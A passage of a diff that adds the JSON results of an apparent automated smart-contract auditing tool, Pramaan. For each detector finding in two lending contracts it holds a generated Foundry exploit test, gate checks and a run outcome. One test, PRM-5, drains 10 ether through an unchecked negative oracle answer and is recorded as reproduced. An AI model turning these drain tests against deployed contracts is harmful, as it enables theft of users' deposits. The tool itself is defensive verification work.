view returns (int256) {\n        return answer;\n    }\n\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (1, answer, updatedAt, updatedAt, 1);\n    }\n}\n\ncontract PramaanExploit_PRM_1 is Test {\n    PramaanTarget internal target;\n    PramaanMockFeed internal feed;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        feed = new PramaanMockFeed(2000e8);\n        vm.startPrank(owner);\n        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));\n        address pramaanDeployed;\n        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }\n        require(pramaanDeployed != address(0), \"Pramaan: deployment failed\");\n        target = PramaanTarget(payable(pramaanDeployed));\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 targetBefore = address(target).balance;\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.borrow(SEED);\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.target_balance_before\", targetBefore);\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: an account with no role took ETH other users deposited\");\n    }\n}\n",
+        "sha256": "b5b1ba70c976ddfe18d50d90888002c3fcb0d292995039b710b2c9ed8f4b79fe"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "3 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "failed",
+        "reason": "over the borrow limit",
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "not-reproduced",
+      "pairs": [
+        {
+          "fixedContract": "OracleLoanFixed",
+          "test": {
+            "fileName": "PramaanExploit_PRM_1_OracleLoanFixed.t.sol",
+            "contractName": "PramaanExploit_PRM_1_OracleLoanFixed",
+            "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-1: template access-control-drain@1, slots filled by heuristics.\n// Hypothesis: OracleLoan.borrow(uint256) moves the contract's ETH without checking who calls it.\n// Property under test: An account with no role must not be able to take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {OracleLoanFixed as PramaanTarget} from \"src/OracleLoanFixed.sol\";\n\n/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker\n/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.\ncontract PramaanMockFeed {\n    uint8 public constant decimals = 8;\n    int256 public answer;\n    uint256 public updatedAt;\n\n    constructor(int256 initialAnswer) {\n        answer = initialAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function set(int256 newAnswer) external {\n        answer = newAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function latestAnswer() external view returns (int256) {\n        return answer;\n    }\n\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (1, answer, updatedAt, updatedAt, 1);\n    }\n}\n\ncontract PramaanExploit_PRM_1_OracleLoanFixed is Test {\n    PramaanTarget internal target;\n    PramaanMockFeed internal feed;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        feed = new PramaanMockFeed(2000e8);\n        vm.startPrank(owner);\n        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));\n        address pramaanDeployed;\n        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }\n        require(pramaanDeployed != address(0), \"Pramaan: deployment failed\");\n        target = PramaanTarget(payable(pramaanDeployed));\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 targetBefore = address(target).balance;\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.borrow(SEED);\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.target_balance_before\", targetBefore);\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: an account with no role took ETH other users deposited\");\n    }\n}\n",
+            "sha256": "19722c0b01a197b0583fb2fa47e3c86b5c5bd737d4c030b485a315023ad5dd97"
+          },
+          "outcome": {
+            "kind": "reverted",
+            "reason": "over the borrow limit"
+          },
+          "verified": false
+        }
+      ]
+    },
+    {
+      "id": "PRM-2",
+      "candidate": {
+        "key": "access-control:OracleLoan:repay()",
+        "vulnClass": "access-control",
+        "title": "Missing access control on a value-moving function",
+        "severity": "high",
+        "confidence": "medium",
+        "contract": "OracleLoan",
+        "function": "repay()",
+        "file": "src/OracleLoan.sol",
+        "lines": [
+          43
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "eth-send-unchecked-address",
+            "description": "ETH transferred without address checks"
+          }
+        ]
+      },
+      "templateId": "access-control-drain",
+      "plan": {
+        "templateId": "access-control-drain",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "OracleLoan",
+          "source": "src/OracleLoan.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [
+            "address(feed)"
+          ],
+          "initializer": null,
+          "lowLevelCreate": true
+        },
+        "fund": {
+          "fn": "deposit",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "repay",
+          "args": []
+        },
+        "drain": null,
+        "hasOwnerGetter": false,
+        "hypothesis": "OracleLoan.repay() moves the contract's ETH without checking who calls it.",
+        "property": "An account with no role must not be able to take ETH that other users deposited.",
+        "preconditions": [
+          "a victim has deposited SEED (10 ether) via deposit",
+          "the attacker holds no role in the contract"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_2.t.sol",
+        "contractName": "PramaanExploit_PRM_2",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-2: template access-control-drain@1, slots filled by heuristics.\n// Hypothesis: OracleLoan.repay() moves the contract's ETH without checking who calls it.\n// Property under test: An account with no role must not be able to take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {OracleLoan as PramaanTarget} from \"src/OracleLoan.sol\";\n\n/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker\n/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.\ncontract PramaanMockFeed {\n    uint8 public constant decimals = 8;\n    int256 public answer;\n    uint256 public updatedAt;\n\n    constructor(int256 initialAnswer) {\n        answer = initialAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function set(int256 newAnswer) external {\n        answer = newAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function latestAnswer() external view returns (int256) {\n        return answer;\n    }\n\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (1, answer, updatedAt, updatedAt, 1);\n    }\n}\n\ncontract PramaanExploit_PRM_2 is Test {\n    PramaanTarget internal target;\n    PramaanMockFeed internal feed;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        feed = new PramaanMockFeed(2000e8);\n        vm.startPrank(owner);\n        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));\n        address pramaanDeployed;\n        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }\n        require(pramaanDeployed != address(0), \"Pramaan: deployment failed\");\n        target = PramaanTarget(payable(pramaanDeployed));\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 targetBefore = address(target).balance;\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.repay();\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.target_balance_before\", targetBefore);\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: an account with no role took ETH other users deposited\");\n    }\n}\n",
+        "sha256": "75ae77473b93fbcd46310c17a8b40597e28a6054f17fb775bd920b7386a975c0"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "2 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "failed",
+        "reason": "Pramaan: an account with no role took ETH other users deposited: 0 < 10000000000000000000",
+        "logs": [
+          "pramaan.target_balance_before: 10000000000000000000",
+          "pramaan.attacker_gain: 0"
+        ],
+        "durationMs": null
+      },
+      "status": "not-reproduced",
+      "pairs": [
+        {
+          "fixedContract": "OracleLoanFixed",
+          "test": {
+            "fileName": "PramaanExploit_PRM_2_OracleLoanFixed.t.sol",
+            "contractName": "PramaanExploit_PRM_2_OracleLoanFixed",
+            "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-2: template access-control-drain@1, slots filled by heuristics.\n// Hypothesis: OracleLoan.repay() moves the contract's ETH without checking who calls it.\n// Property under test: An account with no role must not be able to take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {OracleLoanFixed as PramaanTarget} from \"src/OracleLoanFixed.sol\";\n\n/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker\n/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.\ncontract PramaanMockFeed {\n    uint8 public constant decimals = 8;\n    int256 public answer;\n    uint256 public updatedAt;\n\n    constructor(int256 initialAnswer) {\n        answer = initialAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function set(int256 newAnswer) external {\n        answer = newAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function latestAnswer() external view returns (int256) {\n        return answer;\n    }\n\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (1, answer, updatedAt, updatedAt, 1);\n    }\n}\n\ncontract PramaanExploit_PRM_2_OracleLoanFixed is Test {\n    PramaanTarget internal target;\n    PramaanMockFeed internal feed;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        feed = new PramaanMockFeed(2000e8);\n        vm.startPrank(owner);\n        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));\n        address pramaanDeployed;\n        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }\n        require(pramaanDeployed != address(0), \"Pramaan: deployment failed\");\n        target = PramaanTarget(payable(pramaanDeployed));\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 targetBefore = address(target).balance;\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.repay();\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.target_balance_before\", targetBefore);\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: an account with no role took ETH other users deposited\");\n    }\n}\n",
+            "sha256": "a93e60e465667568c26749cef41fc202c004de6a5944174b4b904ba0b5424274"
+          },
+          "outcome": {
+            "kind": "assertion-failed",
+            "reason": "Pramaan: an account with no role took ETH other users deposited: 0 < 10000000000000000000"
+          },
+          "verified": false
+        }
+      ]
+    },
+    {
+      "id": "PRM-3",
+      "candidate": {
+        "key": "access-control:OracleLoanFixed:borrow(uint256)",
+        "vulnClass": "access-control",
+        "title": "Missing access control on a value-moving function",
+        "severity": "high",
+        "confidence": "high",
+        "contract": "OracleLoanFixed",
+        "function": "borrow(uint256)",
+        "file": "src/OracleLoanFixed.sol",
+        "lines": [
+          29,
+          30,
+          31,
+          32,
+          33,
+          34,
+          35,
+          36,
+          37
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "pramaan-unprotected-sweep",
+            "description": "OracleLoanFixed.borrow(uint256) (src/OracleLoanFixed.sol#29-37) moves the contract's entire balance and does not restrict msg.sender"
+          },
+          {
+            "tool": "aderyn",
+            "detector": "eth-send-unchecked-address",
+            "description": "ETH transferred without address checks"
+          }
+        ]
+      },
+      "templateId": "access-control-drain",
+      "plan": {
+        "templateId": "access-control-drain",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "OracleLoanFixed",
+          "source": "src/OracleLoanFixed.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [
+            "address(feed)"
+          ],
+          "initializer": null,
+          "lowLevelCreate": true
+        },
+        "fund": {
+          "fn": "deposit",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "borrow",
+          "args": [
+            "SEED"
+          ]
+        },
+        "drain": null,
+        "hasOwnerGetter": false,
+        "hypothesis": "OracleLoanFixed.borrow(uint256) moves the contract's ETH without checking who calls it.",
+        "property": "An account with no role must not be able to take ETH that other users deposited.",
+        "preconditions": [
+          "a victim has deposited SEED (10 ether) via deposit",
+          "the attacker holds no role in the contract"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_3.t.sol",
+        "contractName": "PramaanExploit_PRM_3",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-3: template access-control-drain@1, slots filled by heuristics.\n// Hypothesis: OracleLoanFixed.borrow(uint256) moves the contract's ETH without checking who calls it.\n// Property under test: An account with no role must not be able to take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {OracleLoanFixed as PramaanTarget} from \"src/OracleLoanFixed.sol\";\n\n/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker\n/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.\ncontract PramaanMockFeed {\n    uint8 public constant decimals = 8;\n    int256 public answer;\n    uint256 public updatedAt;\n\n    constructor(int256 initialAnswer) {\n        answer = initialAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function set(int256 newAnswer) external {\n        answer = newAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function latestAnswer() external view returns (int256) {\n        return answer;\n    }\n\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (1, answer, updatedAt, updatedAt, 1);\n    }\n}\n\ncontract PramaanExploit_PRM_3 is Test {\n    PramaanTarget internal target;\n    PramaanMockFeed internal feed;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        feed = new PramaanMockFeed(2000e8);\n        vm.startPrank(owner);\n        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));\n        address pramaanDeployed;\n        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }\n        require(pramaanDeployed != address(0), \"Pramaan: deployment failed\");\n        target = PramaanTarget(payable(pramaanDeployed));\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 targetBefore = address(target).balance;\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.borrow(SEED);\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.target_balance_before\", targetBefore);\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: an account with no role took ETH other users deposited\");\n    }\n}\n",
+        "sha256": "e2f3d0b9c978bd251e119c5bb6cc4b7c1d33efff4129a06d2c28225ce4c5a254"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "3 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "failed",
+        "reason": "over the borrow limit",
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "not-reproduced",
+      "pairs": []
+    },
+    {
+      "id": "PRM-4",
+      "candidate": {
+        "key": "access-control:OracleLoanFixed:repay()",
+        "vulnClass": "access-control",
+        "title": "Missing access control on a value-moving function",
+        "severity": "high",
+        "confidence": "medium",
+        "contract": "OracleLoanFixed",
+        "function": "repay()",
+        "file": "src/OracleLoanFixed.sol",
+        "lines": [
+          39
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "eth-send-unchecked-address",
+            "description": "ETH transferred without address checks"
+          }
+        ]
+      },
+      "templateId": "access-control-drain",
+      "plan": {
+        "templateId": "access-control-drain",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "OracleLoanFixed",
+          "source": "src/OracleLoanFixed.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [
+            "address(feed)"
+          ],
+          "initializer": null,
+          "lowLevelCreate": true
+        },
+        "fund": {
+          "fn": "deposit",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "repay",
+          "args": []
+        },
+        "drain": null,
+        "hasOwnerGetter": false,
+        "hypothesis": "OracleLoanFixed.repay() moves the contract's ETH without checking who calls it.",
+        "property": "An account with no role must not be able to take ETH that other users deposited.",
+        "preconditions": [
+          "a victim has deposited SEED (10 ether) via deposit",
+          "the attacker holds no role in the contract"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_4.t.sol",
+        "contractName": "PramaanExploit_PRM_4",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-4: template access-control-drain@1, slots filled by heuristics.\n// Hypothesis: OracleLoanFixed.repay() moves the contract's ETH without checking who calls it.\n// Property under test: An account with no role must not be able to take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {OracleLoanFixed as PramaanTarget} from \"src/OracleLoanFixed.sol\";\n\n/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker\n/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.\ncontract PramaanMockFeed {\n    uint8 public constant decimals = 8;\n    int256 public answer;\n    uint256 public updatedAt;\n\n    constructor(int256 initialAnswer) {\n        answer = initialAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function set(int256 newAnswer) external {\n        answer = newAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function latestAnswer() external view returns (int256) {\n        return answer;\n    }\n\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (1, answer, updatedAt, updatedAt, 1);\n    }\n}\n\ncontract PramaanExploit_PRM_4 is Test {\n    PramaanTarget internal target;\n    PramaanMockFeed internal feed;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        feed = new PramaanMockFeed(2000e8);\n        vm.startPrank(owner);\n        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));\n        address pramaanDeployed;\n        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }\n        require(pramaanDeployed != address(0), \"Pramaan: deployment failed\");\n        target = PramaanTarget(payable(pramaanDeployed));\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 targetBefore = address(target).balance;\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.repay();\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.target_balance_before\", targetBefore);\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: an account with no role took ETH other users deposited\");\n    }\n}\n",
+        "sha256": "9fe099898ef038ae5881f51025b63e4fe45bbc980e3fc8d5ba13ba1933f0ed93"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "2 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "failed",
+        "reason": "Pramaan: an account with no role took ETH other users deposited: 0 < 10000000000000000000",
+        "logs": [
+          "pramaan.target_balance_before: 10000000000000000000",
+          "pramaan.attacker_gain: 0"
+        ],
+        "durationMs": null
+      },
+      "status": "not-reproduced",
+      "pairs": []
+    },
+    {
+      "id": "PRM-5",
+      "candidate": {
+        "key": "unchecked-oracle:OracleLoan:borrow(uint256)",
+        "vulnClass": "unchecked-oracle",
+        "title": "Oracle answer used without checking that it is positive",
+        "severity": "high",
+        "confidence": "medium",
+        "contract": "OracleLoan",
+        "function": "borrow(uint256)",
+        "file": "src/OracleLoan.sol",
+        "lines": [
+          33,
+          34,
+          35,
+          36,
+          37,
+          38,
+          39,
+          40,
+          41
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "pramaan-unchecked-oracle",
+            "description": "OracleLoan.borrow(uint256) (src/OracleLoan.sol#33-41) uses a price feed answer without requiring it to be positive"
+          }
+        ]
+      },
+      "templateId": "oracle-unchecked-price",
+      "plan": {
+        "templateId": "oracle-unchecked-price",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "OracleLoan",
+          "source": "src/OracleLoan.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [
+            "address(feed)"
+          ],
+          "initializer": null,
+          "lowLevelCreate": true
+        },
+        "fund": {
+          "fn": "deposit",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "borrow",
+          "args": [
+            "SEED"
+          ]
+        },
+        "drain": null,
+        "hasOwnerGetter": false,
+        "hypothesis": "OracleLoan.borrow(uint256) uses the price feed's answer without checking that it is positive, so a non-positive answer (cast to uint256) becomes an enormous price.",
+        "property": "A feed that returns a non-positive answer must not let an account holding 1 wei of collateral take ETH that other users deposited.",
+        "preconditions": [
+          "a victim has deposited SEED (10 ether) via deposit",
+          "the attacker holds 1 wei of collateral",
+          "the feed reports an invalid round (answer = -1) after having reported a healthy price"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_5.t.sol",
+        "contractName": "PramaanExploit_PRM_5",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-5: template oracle-unchecked-price@1, slots filled by heuristics.\n// Hypothesis: OracleLoan.borrow(uint256) uses the price feed's answer without checking that it is positive, so a non-positive answer (cast to uint256) becomes an enormous price.\n// Property under test: A feed that returns a non-positive answer must not let an account holding 1 wei of collateral take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {OracleLoan as PramaanTarget} from \"src/OracleLoan.sol\";\n\n/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker\n/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.\ncontract PramaanMockFeed {\n    uint8 public constant decimals = 8;\n    int256 public answer;\n    uint256 public updatedAt;\n\n    constructor(int256 initialAnswer) {\n        answer = initialAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function set(int256 newAnswer) external {\n        answer = newAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function latestAnswer() external view returns (int256) {\n        return answer;\n    }\n\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (1, answer, updatedAt, updatedAt, 1);\n    }\n}\n\ncontract PramaanExploit_PRM_5 is Test {\n    PramaanTarget internal target;\n    PramaanMockFeed internal feed;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        feed = new PramaanMockFeed(2000e8);\n        vm.startPrank(owner);\n        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));\n        address pramaanDeployed;\n        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }\n        require(pramaanDeployed != address(0), \"Pramaan: deployment failed\");\n        target = PramaanTarget(payable(pramaanDeployed));\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        vm.deal(attacker, ATTACK);\n        vm.prank(attacker);\n        target.deposit{value: 1}();\n        vm.prank(attacker);\n        feed.set(-1);\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.borrow(SEED);\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: a non-positive oracle answer let an account with 1 wei of collateral take ETH other users deposited\");\n    }\n}\n",
+        "sha256": "2ba9423dae4b1236a777e1175d7ea363bac8e03a86b1845ada9bd9dac17d2cb2"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "3 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker, attacker, attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "passed",
+        "reason": null,
+        "logs": [
+          "pramaan.attacker_gain: 10000000000000000000"
+        ],
+        "durationMs": null
+      },
+      "status": "reproduced",
+      "pairs": [
+        {
+          "fixedContract": "OracleLoanFixed",
+          "test": {
+            "fileName": "PramaanExploit_PRM_5_OracleLoanFixed.t.sol",
+            "contractName": "PramaanExploit_PRM_5_OracleLoanFixed",
